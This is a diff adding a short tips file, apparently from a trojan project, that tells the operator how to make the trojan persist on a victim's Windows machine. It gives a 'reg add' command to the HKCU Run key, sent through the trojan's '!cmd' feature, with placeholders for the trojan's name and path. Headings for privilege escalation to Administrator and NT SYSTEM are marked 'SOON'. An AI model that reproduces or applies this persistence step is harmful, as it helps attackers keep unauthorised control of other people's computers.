@@ -1,1 +1,12 @@
+# Since this trojan doesnt naturaly inherit any command to put it on startup I've decided to "gracefully" make a Tips text file on how to do it manualy (Among other things)
 
+### Manual Set to Startup
+Run !cmd reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "YourProgramName" /t REG_SZ /d "C:\Path\To\Your\Program.exe" /f
+Replace 'YourProgramName' to the name of the Trojan File
+Replace 'C:\Path\To\Your\Program.exe' to the Trojan File Path
+
+### Manual Elevate to Adminisrator Permissions from User
+SOON
+
+### Manual Elevate to Super Administrator (NT System) from Administrator
+SOON
